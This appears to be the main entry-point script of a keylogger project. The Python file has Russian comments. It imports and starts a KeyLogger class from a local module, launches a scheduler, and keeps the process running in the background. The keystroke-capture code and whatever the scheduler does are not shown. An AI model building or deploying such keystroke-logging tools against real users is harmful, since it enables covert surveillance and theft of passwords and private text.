import time
from logger import KeyLogger
from scheduler import run_scheduler

def main():
    keylogger = KeyLogger()
    keylogger.start()

    run_scheduler()

    # Главный поток "живёт", пока работают фоновые
    try:
        while True:
            time.sleep(3600)  # "спит" по часу, можно и меньше
    except KeyboardInterrupt:
        print("Завершение работы программы.")

if __name__ == "__main__":
    main()



